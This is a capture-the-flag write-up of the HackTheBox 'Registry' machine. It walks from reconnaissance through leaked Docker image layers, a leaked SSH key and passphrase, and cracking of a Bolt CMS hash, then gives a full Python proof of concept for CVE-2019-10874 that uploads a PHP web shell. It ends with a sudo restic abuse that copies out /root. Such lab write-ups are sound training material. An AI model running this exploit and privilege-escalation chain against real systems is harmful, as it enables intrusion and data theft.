---
Title: HackTheBox Registry
Date: 2021-02-13
Category: Challenges
Status: published
---

Registry is a box rated at hard difficulty. There are quite a few steps involved, but with a bit of persistence and little experience with Docker internals ([hint hint]({filename}../software/low-level-debugging-of-stubborn-docker-containers.md)), it looks more daunting than it actually is. Let's go through the process of breaking in step by step! Out initial nmap scan is as unexciting as it can be:

```sh
# Nmap 7.80 scan initiated Fri Jan 10 17:08:06 2020 as: nmap -sS -sC -oN registry.nmap -v 10.10.10.159
Increasing send delay for 10.10.10.159 from 0 to 5 due to 238 out of 792 dropped probes since last increase.
Nmap scan report for 10.10.10.159
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
443/tcp open  https
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jan 10 17:08:20 2020 -- 1 IP address (1 host up) scanned in 14.34 seconds
```

On ports 80 and 443, we both see a default NGINX site. Only the TLS certificate's Common Name `docker.registry.htb` gives us a hint. With the box being called Registry, we can deduce that this server probably has a [Docker registry](https://docs.docker.com/registry/) installed. Accessing the referenced vhost gives us an empty response:

```sh
# http http://registry.htb/ "Host: docker.registry.htb"
HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 0
Date: Sat, 18 Jan 2020 22:19:24 GMT
Server: nginx/1.14.0 (Ubuntu)
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

Playing around with
the [API endpoints](https://docs.docker.com/registry/spec/api/) of the registry server a bit, we decide to take a step back and focus on breadth-first instead of depth-first search. We switch to dirbuster and start some bare endpoint enumeration with a small wordlist. After all, we're here to explore the server, not kill it.Even with a basic wordlist, we quickly find the `/install/` endpoint. It serves some binary data, which we fetch with `curl `and pipe into a file. A quick check shows us that we are looking at gzip-compressed data.

```sh
# file install.blob
install.blob: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200
```

A fantastic tool we can use to analyze the archive without actually extracting it is called `zcat`:

```sh
# zcat install.blob
ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data# Private Docker Registry
```

So we apparently have a CA certificate in our archive, along with a Markdown readme file. Interestingly, we can also see the user `www-data` here. This can be useful later if we need to reference a specific user. Note taken. At this point, we can also read up on the documentation around actually deploying a custom registry and what role certificate files play in it:

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/

With our dirbuster instance running on the side, we discover another endpoint, which leads us to a login page under `/bolt/bolt/login`. However, reading through the
[Bolt documentation](https://docs.bolt.cm/3.7/manual/first-user), we learn that there are no default credentials. So we continue with the Docker registry. Let's try to log in! For that, we need to set up the registry's certificate on our testing machine:

```sh
# mkdir -p /etc/docker/certs.d/docker.registry.htb/
# cp ca.crt /etc/docker/certs.d/docker.registry.htb/
# docker login docker.registry.htb
```

We get an authorization error, but the login itself seems to work. This means that the API we poked around at before is fully functional. Triggering the error manually against the API yields more information:

```sh
# http http://registry.htb/v2/_catalog "Host: docker.registry.htb"
HTTP/1.1 401 Unauthorized
Connection: keep-alive
Content-Length: 145
Content-Type: application/json; charset=utf-8
Date: Sat, 18 Jan 2020 22:43:12 GMT
Docker-Distribution-Api-Version: registry/2.0
Server: nginx/1.14.0 (Ubuntu)
Www-Authenticate: Basic realm="Registry"
X-Content-Type-Options: nosniff

{
    "errors": [
        {
            "code": "UNAUTHORIZED",
            "detail": [
                {
                    "Action": "*",
                    "Class": "",
                    "Name": "catalog",
                    "Type": "registry"
                }
            ],
            "message": "authentication required"
        }
    ]
}
```

Manually trying some dumb credentials with `docker login` while trying to come up with new ideas, we surprisingly hit a match. The login is `admin:admin`. Truly timeless. Now, performing the previous request against the API, we can attach basic auth credentials to the request and get a proper response:

```sh
# http --auth admin:admin http://docker.registry.htb/v2/_catalog
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 32
Content-Type: application/json; charset=utf-8
Date: Sun, 19 Jan 2020 18:00:36 GMT
Docker-Distribution-Api-Version: registry/2.0
Server: nginx/1.14.0 (Ubuntu)
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Content-Type-Options: nosniff
X-Content-Type-Options: nosniff
X-Frame-Options: DENY

{
    "repositories": [
        "bolt-image"
    ]
}
```

This is great because now we can pull the image through docker and inspect it locally:

```sh
# docker pull docker.registry.htb/bolt-image
# docker inspect docker.registry.htb/bolt-image

"GraphDriver": {
    "Data": {
        "LowerDir": "/var/lib/docker/overlay2/55b71b9e7ecad8bd9db33fb7136a5ebd230335a27f575e23a7a8789e4adf5f12/diff:/var/lib/docker/overlay2/23723c0a05e160fbd2d8ef46af0c32a9fa4d7c6db89e64c468efb5ab1e39b42b/diff:/var/lib/docker/overlay2/fd8673b7f16712f9abbac08e89e9bc3bb5dfe7103bf36f2b6caa09e9cb2bbc94/diff:/var/lib/docker/overlay2/9d7d1689a187e1a2e49ab253a9118d5d654f76a617fe73413f6a547c1e546e6c/diff:/var/lib/docker/overlay2/3a8a9e217a3b3522d6f1af817387040c429867baa49a959f43aad1d588182eae/diff:/var/lib/docker/overlay2/247dfb195104bc1eff828a70e1bf0c59efd3af9bf2375c929c2283b043266fcd/diff:/var/lib/docker/overlay2/e28a6ab76f197d83f180fe8ec1ecced8f8da2bbe5bf8115d07c76fad8e610573/diff:/var/lib/docker/overlay2/3f3ae81a5ede643af44988d3c12367fe1d3a1eae42c9cef8c1d1dd1cf2285860/diff",
        "MergedDir": "/var/lib/docker/overlay2/1feaa4c2afdf0a0ef9b0ca0f445e3b71476860ff00192ad68a2d371ecbefff5f/merged",
        "UpperDir": "/var/lib/docker/overlay2/1feaa4c2afdf0a0ef9b0ca0f445e3b71476860ff00192ad68a2d371ecbefff5f/diff",
        "WorkDir": "/var/lib/docker/overlay2/1feaa4c2afdf0a0ef9b0ca0f445e3b71476860ff00192ad68a2d371ecbefff5f/work"
    },
    "Name": "overlay2"
},
```

This underlines a common misconception around Docker images. The filesystem layers when building a Dockerfile are contained in representative directories on the host OS. A Docker image is nothing more than a compressed archive of the FS overlay containing all file changes. Practically, the `MergedDir`, as shown above, includes the merged state of all filesystem layers - this is what most developers see. However, with all layers at our disposal when pulling the image, we can inspect lower-level layers and find changes that are effectively hidden in the merged directory but still present. This can lead developers into thinking that their images do not leak confidential information when, in reality, a low-level layer can still expose it. You just have to know where to look - and that's what we will do now by looking at the diff directory:

```
/var/lib/docker/overlay2/1feaa4c2afdf0a0ef9b0ca0f445e3b71476860ff00192ad68a2d371ecbefff5f/diff
```

In the third layer, we find a bash history file under `/root`. Here is a little snippet that is particularly interesting:

```sh
ls -la
vi config
edit config
apt install vim
vi config
ssh-keygen -t rsa -b 4096 -C "bolt@registry.htb"
l
ls -la
cd ..
ls -la
ssh-add /root/.ssh/id_rsa
eval `ssh-agent -s`
ssh-add /root/.ssh/id_rsa
ps aux | grep ssh
```

Specifically, the SSH commands give us a foreshadowing. And indeed, a few directories further down, we manage to extract a private key:

```sh
# cat /var/lib/docker/overlay2/9d7d1689a187e1a2e49ab253a9118d5d654f76a617fe73413f6a547c1e546e6c/diff/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv
7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL
/mURh0vdBrIfF4psnYiOcIDCkM2EhcVCGXN6BSUxBud+AXF0QP96/8UN8A5+O115
p7eljdDr2Ie2LlF7dhHSSEMQG7lUqfEcTmsqSuj9lBwfN22OhFxByxPvkC6kbSyH
XnUqf+utie21kkQzU1lchtec8Q4BJIMnRfv1kufHJjPFJMuWFRbYAYlL7ODcpIvt
UgWJgsYyquf/61kkaSmc8OrHc0XOkif9KE63tyWwLefOZgVgrx7WUNRNt8qpjHiT
nfcjTEcOSauYmGtXoEI8LZ+oPBniwCB4Qx/TMewia/qU6cGfX9ilnlpXaWvbq39D
F1KTFBvwkM9S1aRJaPYu1szLrGeqOGH66dL24f4z4Gh69AZ5BCYgyt3H2+FzZcRC
iSnwc7hdyjDI365ZF0on67uKVDfe8s+EgXjJWWYWT7rwxdWOCzhd10TYuSdZv3MB
TdY/nF7oLJYyO2snmedg2x11vIG3fVgvJa9lDfy5cA9teA3swlOSkeBqjRN+PocS
5/9RBV8c3HlP41I/+oV5uUTInaxCZ/eVBGVgVe5ACq2Q8HvW3HDvLEz36lTw+kGE
SxbxZTx1CtLuyPz7oVxaCStn7Cl582MmXlp/MBU0LqodV44xfhnjmDPUK6cbFBQc
GUeTlxw+gRwby4ebLLGdTtuYiJQDlZ8itRMTGIHLyWJEGVnO4MsX0bAOnkBRllhA
CqceFXlVE+K3OfGpo3ZYj3P3xBeDG38koE2CaxEKQazHc06aF5zlcxUNBusOxNK4
ch2x+BpuhB0DWavdonHj+ZU9nuCLUhdy3kjg0FxqgHKZo3k55ai+4hFUIT5fTNHA
iuMLFSAwONGOf+926QUQd1xoeb/n8h5b0kFYYVD3Vkt4Fb+iBStVG6pCneN2lILq
rSVi9oOIy+NRrBg09ZpMLXIQXLhHSk3I7vMhcPoWzBxPyMU29ffxouK0HhkARaSP
3psqRVI5GPsnGuWLfyB2HNgQWNHYQoILdrPOpprxUubnRg7gExGpmPZALHPed8GP
pLuvFCgn+SCf+DBWjMuzP3XSoN9qBSYeX8OKg5r3V19bhz24i2q/HMULWQ6PLzNb
v0NkNzCg3AXNEKWaqF6wi7DjnHYgWMzmpzuLj7BOZvLwWJSLvONTBJDFa4fK5nUH
UnYGl+WT+aYpMfp6vd6iMtet0bh9wif68DsWqaqTkPl58z80gxyhpC2CGyEVZm/h
P03LMb2YQUOzBBTL7hOLr1VuplapAx9lFp6hETExaM6SsCp/StaJfl0mme8tw0ue
QtwguqwQiHrmtbp2qsaOUB0LivMSzyJjp3hWHFUSYkcYicMnsaFW+fpt+ZeGGWFX
bVpjhWwaBftgd+KNg9xl5RTNXs3hjJePHc5y06SfOpOBYqgdL42UlAcSEwoQ76VB
YGk+dTQrDILawDDGnSiOGMrn4hzmtRAarLZWvGiOdppdIqsfpKYfUcsgENjTK95z
zrey3tjXzObM5L1MkjYYIYVjXMMygJDaPLQZfZTchUNp8uWdnamIVrvqHGvWYES/
FGoeATGL9J5NVXlMA2fXRue84sR7q3ikLgxDtlh6w5TpO19pGBO9Cmg1+1jqRfof
eIb4IpAp01AVnMl/D/aZlHb7adV+snGydmT1S9oaN+3z/3pHQu3Wd7NWsGMDmNdA
+GB79xf0rkL0E6lRi7eSySuggposc4AHPAzWYx67IK2g2kxx9M4lCImUO3oftGKJ
P/ccClA4WKFMshADxxh/eWJLCCSEGvaLoow+b1lcIheDYmOxQykBmg5AM3WpTpAN
T+bI/6RA+2aUm92bNG+P/Ycsvvyh/jFm5vwoxuKwINUrkACdQ3gRakBc1eH2x014
6B/Yw+ZGcyj738GHH2ikfyrngk1M+7IFGstOhUed7pZORnhvgpgwFporhNOtlvZ1
/e9jJqfo6W8MMDAe4SxCMDujGRFiABU3FzD5FjbqDzn08soaoylsNQd/BF7iG1RB
Y7FEPw7yZRbYfiY8kfve7dgSKfOADj98fTe4ISDG9mP+upmR7p8ULGvt+DjbPVd3
uN3LZHaX5ECawEt//KvO0q87TP8b0pofBhTmJHUUnVW2ryKuF4IkUM3JKvAUTSg8
K+4aT7xkNoQ84UEQvfZvUfgIpxcj6kZYnF+eakV4opmgJjVgmVQvEW4nf6ZMBRo8
TTGugKvvTw/wNKp4BkHgXxWjyTq+5gLyppKb9sKVHVzAEpew3V20Uc30CzOyVJZi
Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H
pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s
OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B
Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR
bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM
PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu
Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ
ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI
f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
```

Even more conveniently, a utility script in the same layer leaks the key's passphrase:

```sh
# cat /var/lib/docker/overlay2/9d7d1689a187e1a2e49ab253a9118d5d654f76a617fe73413f6a547c1e546e6c/diff/etc/profile.d/02-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

So now, we can use the passphrase to decrypt the key. Surprisingly, the same credentials have been used for the `bolt` user on the host machine! So we can now log in and get a proper shell with user-level privileges:

```sh
# ssh -i registry-root.key bolt@registry.htb
Enter passphrase for key 'registry-root.key':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Sun Jan 19 18:58:44 UTC 2020

  System load:  0.13              Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 24%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    153
Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
bolt@bolt:~$
```

This already gives us access to the user flag. A thing we notice right away is the presence of a simple PHP backup script using [restic](https://restic.net/):

```sh
bolt@bolt:/var/www/html$ cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

The script's privileges are restricted to the `www-data` user, however, so we move on. Browsing further through the filesystem, we find an interesting Boltconfiguration file:

```sh
bolt@bolt:/var/www/html$ cat bolt/app/config/config.yml
# Database setup. The driver can be either 'sqlite', 'mysql' or 'postgres'.
#
# For SQLite, only the databasename is required. However, MySQL and PostgreSQL
# also require 'username', 'password', and optionally 'host' ( and 'port' ) if the database
# server is not on the same host as the web server.
#
# If you're trying out Bolt, just keep it set to SQLite for now.
database:
    driver: sqlite
    databasename: bolt
```

Sadly, the target system has no SQLite shell available. But Python has SQLite drivers shipped with its standard library! Opening up a Python shell, we can work some quick magic to extract the Bolt login credentials:

```python
bolt@bolt:/var/www/html/bolt/app/database$ python3
Python 3.6.8 (default, Oct  7 2019, 12:59:55)
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sqlite3
>>> conn = sqlite3.connect("bolt.db")
>>> cur = conn.cursor()
>>> list(cur.execute("SELECT name FROM sqlite_master WHERE type='table';"))
[('bolt_authtoken',), ('sqlite_sequence',), ('bolt_cron',), ('bolt_field_value',), ('bolt_log_change',), ('bolt_log_system',), ('bolt_relations',), ('bolt_taxonomy',), ('bolt_users',), ('bolt_homepage',), ('bolt_pages',), ('bolt_entries',), ('bolt_showcases',), ('bolt_blocks',)]

>>> list(cur.execute("SELECT * FROM bolt_users;"))
(1, 'admin', '$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK', 'bolt@registry.htb', '2019-10-17 14:34:52', '10.10.14.2', 'Admin', '["files://shell.php"]', 1, None, None, None, 3, None, '["root","everyone"]')
```

Locally, we crack the credentials with John:

```sh
# john --wordlist=/usr/share/wordlists/rockyou.txt bolt.key
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (?)
1g 0:00:00:06 DONE (2020-01-18 20:56) 0.1436g/s 51.72p/s 51.72c/s 51.72C/s strawberry..brianna
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we find out that all standing between us and a successful login previously was the credentials `Admin:strawberry`. Logging in and looking around, we learn that the installed version is vulnerable to an [authenticated remote code execution](https://fgsec.net/from-csrf-to-rce-bolt-cms/). Remembering the mental note about the previous backup script, the battle plan is as follows: Use the remote code execution vulnerability to gain access in Bolt as `www-data` user, maybe by installing a web shell for better persistence, and gain access to `restic `from there. Hopefully, this will bring us a step closer to compromising the backup files it handles.However, trying out the proof-of-concept code does not yield success as the stager payload keeps getting deleted. Maybe a bug in the researcher's code, perhaps something specific to the system. Or just me fat-fingering this, but I tried *really hard* for a good hour. At this point, let's just learn the internals of the exploit and reimplement a better proof-of-concept in Python.So here is my PoC for [CVE-2019-10874](https://nvd.nist.gov/vuln/detail/CVE-2019-10874):

```python
from pathlib import Path

import requests
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options

COMMAND = "<stuff here>"
USERNAME = "admin"
PASSWORD = "strawberry"
PAYLOAD_NAME = "payload.php"
PAYLOAD_PATH = str(Path(PAYLOAD_NAME).absolute())
TARGET = "http://registry.htb"
BOLT_URL = TARGET + "/bolt/bolt"

LOGIN_URL = BOLT_URL + "/login"
CONFIG_URL = BOLT_URL + "/file/edit/config/config.yml"
UPLOAD_URL = BOLT_URL + "/files"
PAYLOAD_URL = TARGET + "/bolt/files/" + PAYLOAD_NAME

options = Options()
options.headless = True
client = webdriver.Firefox(options=options)
client.get(LOGIN_URL)

username_element = client.find_element_by_id("user_login_username")
password_element = client.find_element_by_id("user_login_password")
form_btn_element = client.find_element_by_id("user_login_login")

username_element.clear()
username_element.send_keys(USERNAME)
password_element.clear()
password_element.send_keys(PASSWORD)

print("[+] Logging in as", USERNAME)
form_btn_element.click()

# post config with php extension
client.get(CONFIG_URL)
fileedit_element = client.find_element_by_css_selector('.CodeMirror textarea')
form_btn_element = client.find_element_by_id("file_edit_save")

print("[+] Replace xlsx -> php")
actions = ActionChains(client)
actions.move_to_element(fileedit_element)
actions.click()
actions.key_down(Keys.CONTROL).send_keys('h').key_up(Keys.CONTROL)
actions.send_keys("xlsx").send_keys(Keys.RETURN).send_keys("php")
actions.send_keys(Keys.RETURN)
actions.perform()

print("[+] Saving config")
form_btn_element.click()

# upload php file
client.get(UPLOAD_URL)
Alert(client).accept()
client.get(UPLOAD_URL)
client.get(UPLOAD_URL)

select_element = client.find_element_by_id("file_upload_select")
upload_element = client.find_element_by_id("file_upload_upload")

select_element.send_keys(PAYLOAD_PATH)
print("[+] Uploading", PAYLOAD_PATH)
upload_element.click()
client.close()

print("[+] Executing command")
# call php payload and execute payload
resp = requests.get(PAYLOAD_URL, params={"cmd": COMMAND})
print("[+] Got response!")
print(resp.text)
```

While getting [Selenium](https://www.selenium.dev/documentation/webdriver/getting_started/) to work increases the initial effort to get the PoC to run, it makes the payload delivery way more reliable. And indeed, using the script, we get access. Executing it with `sudo -l`:

```
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

As `www-data`, we can run `restic `as root, which theoretically allows us to steal the backup files. We have to host a [restic](https://github.com/restic/rest-server) server for that. So we download the repo to our localhost first. To hide our activity from other nosy users on the box, we create some weird temp directory that looks like a system-internal one:

```sh
$ mkdir -p /tmp/systemd-private-00x-systemd-resolver.service/
```

Then we upload the restic server from our localhost to the box:

```sh
$ scp -i ~/registry/registry-root.key rest-server bolt@registry.htb:/tmp/systemd-private-00x-systemd-resolver.service/
```

Then we run the restic server on the box:

```sh
bolt@bolt:/tmp/systemd-private-00x-systemd-resolver.service/content$ ./rest-server --no-auth --listen 0.0.0.0:4545 --path content
```

We also need to define a local password file containing an encryption password. We can arbitrarily set one and use it later to decrypt the contents locally. After the setup, we're ready to trigger the backup through our PoC:

```sh
sudo restic backup -r rest:http://127.0.0.1:4545/ --password-file=/tmp/systemd-private-00x-systemd-resolver.service/pass.txt /root 2>&1
```

And with the following response, we can see that we successfully backed up the root directory!

```sh
$ python3 exploit.py
[+] Logging in as admin
[+] Replace xlsx -> php
[+] Saving config
[+] Uploading /root/registry/payload.php
[+] Executing command
[+] Got response!
scan [/root]
[0:00] 10 directories, 14 files, 28.066 KiB
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00
```

We can list the backups on the box:

```sh
bolt@bolt:/tmp/systemd-private-00x-systemd-resolver.service/content$ restic -r . snapshots
enter password for repository:
password is correct
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
2a4c5a70  2020-02-12 17:32:13  bolt                    /root
----------------------------------------------------------------------
```

.. and finally, dump the backup contents:

```sh
bolt@bolt:/tmp/systemd-private-00x-systemd-resolver.service/content$ restic -r . dump 2a4c5a70 /root/root.txt
enter password for repository:
password is correct
<flag here>
```

This leaves us with the root flag! What a ride!
